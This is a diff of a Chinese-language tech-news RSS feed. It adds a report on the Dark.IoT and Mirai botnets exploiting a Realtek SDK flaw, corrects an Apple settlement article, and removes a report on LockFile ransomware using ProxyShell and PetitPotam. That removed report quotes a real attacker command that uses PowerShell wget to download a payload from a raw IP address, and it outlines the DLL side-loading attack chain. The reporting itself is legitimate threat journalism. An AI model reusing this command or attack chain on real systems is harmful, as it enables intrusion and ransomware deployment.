@@ -6,9 +6,26 @@
  <description></description>
  <language>zh-hant</language>
 <item>
+ <title>殭屍網路程式正試圖攻擊Realtek晶片SDK漏洞</title>
+ <link>https://www.ithome.com.tw/news/146420</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;本月稍早安全廠商揭露&lt;a href=&quot;https://www.ithome.com.tw/news/146236&quot; target=&quot;_blank&quot;&gt;瑞昱半導體的無線晶片SDK存在多項安全漏洞&lt;/a&gt;，影響65家IoT廠商，本周另外二家安全業者相信，已經有駭客盯上採用Realtek晶片的IoT裝置，企圖感染殭屍網路程式。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.radware.com/security/threat-advisories-and-attack-reports/dark-iot-botnet&quot; target=&quot;_blank&quot;&gt;安全廠商Radware上周發現一隻殭屍網路程式Dark.IoT的攻擊活動&lt;/a&gt;。他們是在今年二月首次發現這隻殭屍網路程式，並依程式二進位檔以攻擊對象種類命名的手法，稱之為Dark.IoT。8月間，他們發現這隻惡意程式將CVE-2021-35395納入其開採的對象。這正是稍早被IoT Inspectors公開的Realtek晶片SDK 10多項漏洞中的一項。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.realtek.com/images/safe-report/Realtek_APRouter_SDK_Advisory-CVE-2021-35392_35395.pdf&quot; target=&quot;_blank&quot;&gt;根據瑞昱的說明&lt;/a&gt;，CVE-2021-35395是一項阻斷服務（Denial of Service）漏洞，發生在HTTP Web server “boa”對傳入的HTTP呼叫中的引數驗證不足，攻擊者可加入過長的呼叫引數來引發緩衝溢位，進而導致裝置服務毁損、中斷服務。&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-35395&quot; target=&quot;_blank&quot;&gt;CVE-2021-35395的CVSS 3.0風險值高達9.8&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;瑞昱已經釋出新版SDK，以修補有問題的版本。&lt;/p&gt;
+&lt;p&gt;Palo Alto今年三月發現，Dark.IoT進入受害系統中會刪除/tmp 及 /var/資料夾的紀錄檔以隱藏攻擊行蹤。它的shell script還會終止裝置上的合法防護行程，以便下載Dark.IoT二進位檔。&lt;/p&gt;
+&lt;p&gt;Radware研究人員Daniel Smith指出，Dark.IoT的操作組織是等著白帽駭客公佈新漏洞及概念驗證（PoC）才出手，在幾天內將新漏洞納編進化其殭屍網路。但另一方面納編CVE-2021-35395，還需要路徑穿越(path traversal)漏洞結合惡意組態檔注入手法，這需要相當功力，顯示他們不是寫程式作亂的外行人。&lt;/p&gt;
+&lt;p&gt;研究人員相信Dark.IoT和Mirai變種背後是同一個駭客組織。事實上，CVE-2021-35395可能更早就讓用戶曝險。以色列安全公司&lt;a href=&quot;https://www.helpnetsecurity.com/2021/08/24/cve-2021-35395-exploitation/&quot; target=&quot;_blank&quot;&gt;SAM Seamless Network另外還發現&lt;/a&gt;，駭客開採CVE-2021-35395以植入Mirai變種。&lt;/p&gt;
+&lt;p&gt;Mirai變種今年以來活動猖獗。&lt;a href=&quot;https://www.ithome.com.tw/news/143288&quot; target=&quot;_blank&quot;&gt;Palo Alto&lt;/a&gt;及&lt;a href=&quot;https://www.ithome.com.tw/news/146091&quot; target=&quot;_blank&quot;&gt;Tenable&lt;/a&gt;公司分別發現Mirai變種攻擊鎖定多種IoT設備，包括使用智易科技（Arcadyan）韌體的37款路由器設備。&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Fri, 27 Aug 2021 04:15:44 +0000</pubDate>
+ <dc:creator>林妍溱</dc:creator>
+ <guid isPermaLink="false">146420 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146420#comments</comments>
+</item>
+<item>
  <title>蘋果讓步了，同意讓開發者與使用者溝通其它付款方式</title>
  <link>https://www.ithome.com.tw/news/146419</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://www.apple.com/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/&quot; target=&quot;_blank&quot;&gt;蘋果在26日宣布&lt;/a&gt;，在一起由美國開發者提出的集體訴訟案中，該公司與提告人已與達成和解協議，蘋果將同意讓開發者與使用者溝通其它付款方式，以讓使用者選擇自App Store以外的途徑付款，同時蘋果也發表了新聞合作夥伴專案（News Partner Program），邀請獨立媒體加入Apple News，且承諾只會抽取15%的訂閱費用。&lt;/p&gt;
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://www.apple.com/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/&quot; target=&quot;_blank&quot;&gt;蘋果在26日宣布&lt;/a&gt;，在一起由美國開發者提出的集體訴訟案中，該公司與提告人已達成和解協議，蘋果將同意讓開發者與使用者溝通其它付款方式，以讓使用者選擇自App Store以外的途徑付款，同時蘋果也發表了新聞合作夥伴專案（News Partner Program），邀請獨立媒體加入Apple News，且承諾只會抽取15%的訂閱費用。&lt;/p&gt;
 &lt;p&gt;此案無關&lt;a href=&quot;https://www.ithome.com.tw/news/139405&quot; target=&quot;_blank&quot;&gt;Epic Games與蘋果之間的訴訟案&lt;/a&gt;，而是有一群美國小型開發者在2019年集體控告蘋果違反反托拉斯法令。&lt;/p&gt;
 &lt;p&gt;根據雙方的協議，雙方同意維持App Store針對小型開發者既有的拆帳架構，亦即年收入低於100萬美元的開發者，只需支付15%的拆帳比例；且App Store的搜尋功能在3年內，都必須基於客觀標準提供搜尋結果，例如下載數、評價及關聯性等；蘋果除了讓開發者能夠申訴被拒絕的程式之外，也將更清楚地闡明上述流程，以及發表年度透明度報告，與外界分享程式審核的各種數據。&lt;/p&gt;
 &lt;p&gt;在此次的協議中，蘋果最大的讓步當屬將允許開發者接觸使用者，提供App Store以外的支付管道。蘋果表示，開發者可透過電子郵件等工具與使用者溝通，且蘋果無法對這些在App Store以外發生的交易收取佣金。&lt;/p&gt;
@@ -213,37 +230,6 @@
  <dc:creator>王若樸</dc:creator>
  <guid isPermaLink="false">146407 at https://www.ithome.com.tw</guid>
  <comments>https://www.ithome.com.tw/news/146407#comments</comments>
-</item>
-<item>
- <title>勒索軟體LockFile濫用PetitPotam漏洞，掌控AD網域伺服器</title>
- <link>https://www.ithome.com.tw/news/146406</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;新的勒索軟體攻擊大肆濫用近期公開的重大漏洞，而使得企業與組織難以招架。例如，&lt;a href=&quot;https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockfile-ransomware-new-petitpotam-windows&quot;&gt;賽門鐵克揭露一起名為LockFile勒索軟體的攻擊行動&lt;/a&gt;，其中攻擊者先是經由Exchange郵件伺服器，入侵企業內部網路環境，接下來再藉著&lt;a href=&quot;https://www.ithome.com.tw/news/145919&quot;&gt;PetitPotam漏洞（CVE-2021-36942）&lt;/a&gt;，控制AD網域伺服器，並感染內網的電腦。&lt;/p&gt;
-&lt;p&gt;這起攻擊行動賽門鐵克最早在7月20日發現，受害者是美國的金融組織，而該公司看到最新的攻擊出現於8月20日，至少有10個組織遭到LockFile攻擊，受害組織遍及全世界，但多數位於美國及亞洲。&lt;/p&gt;
-&lt;p&gt;對於LockFile受害組織的類型，包括製造業、金融服務、工程公司、法務公司、商業服務，以及旅遊業等。&lt;/p&gt;
-&lt;p&gt;至於攻擊者的身分為何？賽門鐵克指出，根據駭客留下來的勒索訊息中，提供受害者聯繫的電子郵件信箱&lt;a href=&quot;mailto:contact@contipauper&quot;&gt;contact@contipauper&lt;/a&gt;[.]com，可能是與Conti相關的駭客組織所為。而這個勒索訊息的畫面，也與日前&lt;a href=&quot;https://www.ithome.com.tw/news/146157&quot;&gt;攻擊大型IT顧問公司Accenture的LockBit&lt;/a&gt;極為相似，但這兩個勒索軟體之間是否有所關連？賽門鐵克沒有進一步說明。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://s4.itho.me/sites/default/files/images/Figure 1_0-s.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/Figure%201_0-s.png&quot; style=&quot;width: 580px; height: 232px;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;攻擊者先占據Exchange伺服器，再藉由AD網域伺服器「派送」勒索軟體&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;針對於LockFile攻擊的過程，賽門鐵克提出進一步的說明。攻擊者先是入侵Exchange郵件伺服器，並下達PowerShell命令，試圖使用Wget程式下載檔案，但究竟攻擊者下載了什麼？賽門鐵克表示不得而知，僅表示在發動勒索軟體攻擊之前，駭客會維持存取受害組織的網路數日。&lt;/p&gt;
-&lt;p&gt;直到即將植入勒索軟體的前20至30分鐘，攻擊者會在上述遭到入侵的Exchange郵件伺服器上，開始部署一組工具，分別是efspotato.exe、active_desktop_render.dll，以及active_desktop_launcher.exe等3個檔案。&lt;/p&gt;
-&lt;p&gt;其中，efspotato.exe是PetitPotam漏洞的濫用工具，疑似來自GitHub上的概念性驗證（PoC）工具；而active_desktop_launcher.exe是合法應用程式，它是中國酷狗音樂所推出的動態桌面軟體（KuGou Active Desktop），攻擊者將它用來側載惡意程式庫active_desktop_render.dll。&lt;/p&gt;
-&lt;p&gt;這個惡意DLL一旦被成功載入，就會企圖解密伺服器本機上一個名為desktop.ini的檔案。如果這個INI檔案成功解密，將會執行Shellcode。賽門鐵克表示，目前他們尚未取得這個desktop.ini進行分析，而無法進一步說明過程中執行了那些行為。&lt;/p&gt;
-&lt;p&gt;而賽門鐵克推測，這個加密Shellcode的用途，應該就是啟動efspotato.exe，濫用PetitPotam漏洞攻擊AD網域伺服器。該公司強調，雖然&lt;a href=&quot;https://www.ithome.com.tw/news/146154&quot;&gt;微軟已於8月的例行修補（Patch Tuesday）提供修補程式&lt;/a&gt;，但隨後有資安研究人員指出，修補程式並未完全修補這項漏洞，&lt;a href=&quot;https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1&quot;&gt;而能夠在已經安裝修補程式的Windows伺服器上重現&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;一旦成功存取AD網域伺服器，攻擊者就會在網域伺服器的指定資料夾（sysvol\domain\scripts）中，「部署」LockFile勒索軟體相關檔案，而上述提及的資料夾路徑，就是所有的網路使用者向網域控制器執行身分驗證時，用來部署指令碼（Script）的資料夾。換言之，只要電腦使用者登入網域，電腦就會複製LockFile的檔案並且執行，將電腦的檔案加密。&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;攻擊者入侵的管道竟是運用甫被揭露的Exchange重大漏洞ProxyShell&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;揭露此事的賽門鐵克表明，本次攻擊行動仍有多處細節仍不明朗，尤其是攻擊者入侵Exchange伺服器的手法，仍有待調查。不過，有資安研究人員根據蜜罐（Honeypot）所收集的情報，指出LockFile攻擊者就是利用ProxyShell漏洞來下手。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://doublepulsar.com/multiple-threat-actors-including-a-ransomware-gang-exploiting-exchange-proxyshell-vulnerabilities-c457b1655e9c&quot;&gt;資安研究人員Kevin Beaumont於8月21日指出&lt;/a&gt;，他的蜜罐在8月13日，偵測到濫用ProxyShell漏洞的攻擊行動，駭客試圖在蜜罐植入Webshell，而且，多數防毒軟體無法識別這個Webshell檔案有害。這個攻擊引起Kevin Beaumont注意的原因，就是攻擊來源IP位址與賽門鐵克揭露的一致。&lt;/p&gt;
-&lt;p&gt;事隔3日，Kevin Beaumont看到駭客再度入侵蜜罐，並且下達新的攻擊命令與植入LockFile檔案。也就是說，攻擊者最初入侵Exchange伺服器的手段，就是濫用ProxyShell漏洞。&lt;/p&gt;
-&lt;blockquote class=&quot;twitter-tweet&quot;&gt;&lt;p dir=&quot;ltr&quot; lang=&quot;en&quot; xml:lang=&quot;en&quot;&gt;Another ProxyShell attack, actions on target:&lt;/p&gt;
-&lt;p&gt;&quot;C:\Windows\System32\cmd.exe&quot; /c powershell wget &lt;a href=&quot;http://209.14.0.234:55676/P0BV1KrEwh8Xgeo6ctNq&quot;&gt;http://209.14.0.234:55676/P0BV1KrEwh8Xgeo6ctNq&lt;/a&gt; &lt;a href=&quot;https://t.co/5YxPBYPt9F&quot;&gt;https://t.co/5YxPBYPt9F&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;— Kevin Beaumont (@GossiTheDog) &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1427225282713427968?ref_src=twsrc%5Etfw&quot;&gt;August 16, 2021&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
-&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;&lt;p&gt;針對這項發現，Kevin Beaumont指出，雖然這組漏洞微軟已於4月發布修補程式，但相較於另一組在3月修補的重大漏洞ProxyLogon，他認為攻擊者濫用ProxyShell的門檻較低，而且大型組織很可能還沒有安裝修補程式，而導致攻擊者能輕易入侵Exchange伺服器。而ProxyShell已被駭客大肆濫用的現象，也使得&lt;a href=&quot;https://www.ithome.com.tw/news/146353&quot;&gt;美國網路安全及基礎設施安全局（CISA）提出呼籲&lt;/a&gt;，企業應儘速修補Exchange伺服器。&lt;/p&gt;
-&lt;p&gt;對於LockFile勒索軟體攻擊濫用ProxyShell漏洞的行為，也有另一家資安業者TG Soft揭露他們的看法，並&lt;a href=&quot;https://twitter.com/VirITeXplorer/status/1428750497872232459&quot;&gt;公布了攻擊流程圖&lt;/a&gt;，指出攻擊者在使用了efspotato.exe之後，使用了&lt;a href=&quot;https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/#ransomware-payloads&quot;&gt;Vatet Loader&lt;/a&gt;來載入滲透測試工具Cobalt Strike，進而更動群組原則來散布勒索軟體LockFile。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://s4.itho.me/sites/default/files/images/E9Pv92oXIAwh2oC-s.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/E9Pv92oXIAwh2oC-s.png&quot; style=&quot;width: 580px; height: 177px;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Thu, 26 Aug 2021 09:50:54 +0000</pubDate>
- <dc:creator>周峻佑</dc:creator>
- <guid isPermaLink="false">146406 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146406#comments</comments>
 </item>
 </channel>
 </rss>
